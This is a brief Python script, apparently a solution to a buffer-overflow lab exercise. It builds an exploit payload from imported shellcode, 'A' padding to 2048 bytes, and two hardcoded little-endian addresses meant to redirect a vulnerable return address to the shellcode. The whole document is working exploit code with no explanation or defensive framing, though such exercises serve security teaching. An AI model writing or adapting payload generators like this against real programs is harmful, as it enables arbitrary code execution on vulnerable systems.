import sys
from shellcode import shellcode

'''
0xFFF6D8D8: shellcode addr
0xFFF6E0EC: vulnerable return addr

p -> vulnerable return addr
a -> shellcode addr
'''

sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b"A" * (2048 - len(shellcode)))
sys.stdout.buffer.write(0xFFF6D8D8.to_bytes(4, "little"))
sys.stdout.buffer.write(0xFFF6E0EC.to_bytes(4, "little"))
